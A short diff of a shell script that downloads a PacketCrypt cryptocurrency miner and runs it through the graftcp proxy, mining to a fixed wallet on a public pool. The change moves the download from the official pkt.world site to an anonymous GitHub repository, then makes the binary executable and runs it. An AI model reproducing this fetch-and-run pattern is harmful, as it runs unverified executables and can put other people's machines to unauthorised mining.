@@ -27,7 +27,7 @@ sleep .2
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah
+./graftcp/graftcp wget https://github.com/kiposnakursi/a/raw/main/lah
 chmod +x lah
 
 ./graftcp/graftcp ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pktpool.io/ 
